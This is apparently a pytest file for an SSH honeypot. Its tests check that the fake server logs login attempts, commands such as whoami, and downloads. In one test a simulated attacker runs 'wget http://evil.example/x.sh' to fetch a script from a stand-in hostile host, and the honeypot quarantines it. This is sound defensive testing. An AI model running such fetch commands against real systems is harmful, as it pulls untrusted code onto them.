import asyncio
import asyncssh

from honeypot.sensors.ssh_server import start_server
from honeypot.storage.db import Storage


def run_client(tmp_path, port, password, command=None):
    # поднимаем сервер, заходим, возвращаем путь к базе и вывод команды
    db_path = tmp_path / "t.db"

    async def run():
        out = None
        server = await start_server(port=port, key_path=str(tmp_path / "key"),
                                    db_path=str(db_path),
                                    log_path=str(tmp_path / "e.jsonl"),
                                    quarantine_path=str(tmp_path / "quarantine"))
        try:
            async with asyncssh.connect("127.0.0.1", port, username="root",
                                        password=password, known_hosts=None) as conn:
                if command:
                    out = (await conn.run(command)).stdout
        except asyncssh.PermissionDenied:
            pass  # неверный пароль
        server.close()
        await server.wait_closed()
        return out

    out = asyncio.run(run())
    return db_path, out


def test_bad_password(tmp_path):
    db_path, _ = run_client(tmp_path, 2299, "zzz")
    auth = Storage(db_path).get_events(event_type="auth")
    assert auth[0]["payload"]["password"] == "zzz"
    assert auth[0]["payload"]["success"] is False


def test_download_event(tmp_path):
    db_path, out = run_client(tmp_path, 2296, "123456",
                              "wget http://evil.example/x.sh")
    assert "x.sh saved" in out
    dl = Storage(db_path).get_events(event_type="download")
    assert dl[0]["payload"]["url"] == "http://evil.example/x.sh"
    assert len(dl[0]["payload"]["sha256"]) == 64
    assert list((tmp_path / "quarantine").glob("*_x.sh"))


def test_login_and_command(tmp_path):
    db_path, out = run_client(tmp_path, 2298, "123456", "whoami")
    assert out == "root\n"
    cmds = Storage(db_path).get_events(event_type="command")
    assert cmds[0]["payload"]["cmd"] == "whoami"